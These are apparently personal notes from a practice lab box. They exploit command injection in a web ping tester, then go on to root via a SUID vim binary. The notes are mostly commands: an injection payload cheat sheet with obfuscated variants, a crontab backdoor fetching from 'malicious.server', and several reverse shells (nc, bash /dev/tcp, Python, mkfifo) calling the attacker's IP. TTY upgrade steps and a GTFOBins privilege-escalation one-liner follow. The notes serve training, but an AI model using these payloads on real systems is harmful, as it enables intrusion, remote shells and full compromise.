upon initial `web enumeration` the site is a `PING CONNECTION TESTER`
![[Pasted image 20250113125354.png]]
upon testing hitting our own kali `IP address` we are able to hit it
![[Pasted image 20250113125536.png]]
the `?host=192.168.45.245` looks like a place we may be able to get command injection

#### Initial things to try
If `user input` is incorporated into system commands without proper sanitization, test if you can execute arbitrary commands on the server.
Example: Inject payloads into input fields or parameters to execute system commands, such as:
`; ls` or `&& ls` to list files in the current directory.  [ ]
`; cat /etc/passwd` to read sensitive files.
`| whoami` to determine the user context of the application.
Using payloads like `$(id)` or `` `id` `` to execute commands in subshells.
Test using variations of common delimiters (`;`, `&&`, `||`, `|`, `$( )`, `` ` ` ``) depending on the command execution context.

##### Basic Command Injection Payloads
- [ ] 
- [x] `; ls` 
- [x]  `&& ls` 
- [x] `| whoami`
- [x] `; cat /etc/passwd`
- [x] `&& id`
- [x] `$(id)`
- [x] `` `id` ``
- [x] `; echo Hello`
- [x] `;which nc`

---

##### Encoded and Obfuscated Variants

1. URL encoding: `%3Bls` (`;ls`)
2. Base64 encoding: `$(echo aWQ= | base64 -d | sh)` (`id`)
3. Hex encoding: `$'\x69\x64'` (`id`)

---

##### Special Characters and Escaping

1. `\` Injection: `\` followed by the command
2. Single-quote bypass: `'; ls #`
3. Double-quote bypass: `"; ls #`
4. Multi-command chaining: `ls; cat /etc/passwd`

---

##### Environmental Variable and File Descriptors

1. `$(cat /etc/passwd)`
2. `${IFS}ls` (using the IFS variable)
3. `/bin/sh -c ls`
4. `0<&196;exec 196<>/dev/tcp/<IP>/<PORT>;sh <&196 >&196 2>&196`

---

##### Advanced Injection Techniques

1. `;$(id)`
2. `;perl -e 'print "Hacked"'`
3. `&$(python3 -c 'print("Hacked")')`
4. `| awk 'BEGIN {system("ls")}'`
5. `| bash -c 'echo Exploited'`

---

##### System Backdoor Techniques

1. Reverse shell payload: `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`
2. Write to crontab: `; echo '* * * * * /bin/bash -c "curl http://malicious.server | sh"' | crontab -`


#### What worked
`;ls`, highlighted is the file shown with ls
![[Pasted image 20250113125919.png]]
`|whoami`
![[Pasted image 20250113130544.png]]
`; cat /etc/passwd`
![[Pasted image 20250113130949.png]]
`; echo Hello`
![[Pasted image 20250113131722.png]]
`; which nc` - machine has `nc`
![[Pasted image 20250113132302.png]]
testing to see if we can get a `nc` reverse shell - was unsuccessful
`bash nc 192.168.45.245 9000 -e /bin/bash`
`nc 192.168.45.245 9000 -e /bin/bash`
`nc 192.168.45.245 9000 -e sh`
![[Pasted image 20250113133800.png]]
using `/etc/passwd` information was able to find `local.txt` with `;ls /home/dylan`
![[Pasted image 20250113133841.png]]
pulled the `local.txt` with `cat /home/dylan/local.txt`, still need a shell
`63935cdba07178776dde4c63a93c721e`

![[Pasted image 20250113133916.png]]
`wget` payload failed `|wget http://192.168.45.245/test.txt`, struggling to get `RCE` - have `LCE`
- after looking at a walkthrough up to this point - this is the vector, something is wrong with the machine going to reset.
![[Pasted image 20250113135400.png]]
was able to get `;curl 192.168.45.245` to work by restarting the `VPN` and `Reverting` the machine
![[Pasted image 20250113160515.png]]
`python3` server hitting
![[Pasted image 20250113160542.png]]
`nc` one liner reverse shell still didnt work
`http://shakabra/?host=192.168.45.245;nc%20192.168.45.245%209000%20-e%20/bin/bash`
![[Pasted image 20250113160724.png]]
going to try pulling over a reverse shell and executing it
`bash -i >& /dev/tcp/192.168.45.245/9000 0>&1`
![[Pasted image 20250113161010.png]]
pulling it over `/usr/bin/curl 192.168.45.245/revshell.sh`
![[Pasted image 20250113161329.png]]
proof it actually worked
![[Pasted image 20250113161345.png]]
attempted to `chmod` to make executable - dont think it worked
![[Pasted image 20250113161653.png]]
attempted to execute,, definitely didnt work
![[Pasted image 20250113161725.png]]
`python3` is on the machine
going to try `pentestmonkey` reverse shell
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.245",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```
was able to pull over the file, the chmod and execute didnt work - going to have to try to execute
```
http://shakabra/?host=192.168.45.245;curl%20http://192.168.45.245/pentestmonkey.py;chmod%20+x%20pentestmonkey.py|bash
```
![[Pasted image 20250113162240.png]]
the `PWD` of `/var/www/html` is not writeable on this machine
![[Pasted image 20250113163602.png]]
curling over `curl 192.168.45.245/revshell.sh -o /tmp/revshell.sh` to `/tmp`
![[Pasted image 20250113163647.png]]
`ls -ls /tmp/` to make sure it was pulled over
![[Pasted image 20250113163713.png]]
making sure `chmod` is on the machine
![[Pasted image 20250113163730.png]]
changing to `executable` permissions
![[Pasted image 20250113163753.png]]
now it is executable
![[Pasted image 20250113163808.png]]
tried to execute payload and server crashed with `bash /tmp/revshell.sh`
![[Pasted image 20250113163852.png]]
also tried `;/tmp/revshell.sh | bash` didnt work
![[Pasted image 20250113163938.png]]
what I was able to use to get a reverse shell, this had to be placed in the actual ping field to work - the only one that worked was the `nc mkfifo` from revshells
![[Pasted image 20250113174240.png]]
had to be placed in the actual `ping` `COnnection tester`
- a big problem i had when working on this machine was sometimes when i'd ping my own machine it wouldnt hit - in order to fix this i would have to reset the `VPN` constantly
![[Pasted image 20250113175035.png]]
```bash
192.168.45.245; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.245 80 >/tmp/f
```
once I was able to get a reverse shell I spawned in as `www-data` but with no `tty` so I had to upgrade it 
![[Pasted image 20250113175117.png]]
getting a `TTY`
```bash
script /dev/null -c /bin/bash 
CTRL + Z 
stty raw -echo; fg 
reset
Terminal type? screen
```
![[Pasted image 20250113175355.png]]
and was able to get `local.txt`
![[Pasted image 20250113172958.png]]
once got the flag we need to privesc, a method to do this is by utilizing this command which looks for files that can run as `root` with the `SUID` bit set
```bash
find / -perm -u=s -type f 2>/dev/null
```
the `vim.basic` stands out and is also the only one in `GTFO` bins that allows for `SUID` priv esc
![[Pasted image 20250113173239.png]]
`GTFObins` has a method to `privesc` utilizing this but we have to use the `python3` method
![[Pasted image 20250113173431.png]]
```bash
./usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```
once hitting enter with this it puts us in a weird `vim` environment
![[Pasted image 20250113173707.png]]
upon hitting `q` and `ENTER` we get `Terminal Type?` and we have to type `SCREEN` to get output
![[Pasted image 20250113173936.png]]
and after typing `screen` we get put into a root shell
![[Pasted image 20250113174009.png]]
once we are root just look for the flag
```bash
# whoami
root
# find / "proof.txt" 2>/dev/null | grep "proof.txt"
/root/proof.txt
# cat /root/proof.txt
b2ad376b89e2d511e5d4e7ace3a5fdb0
```

![[Pasted image 20250113174142.png]]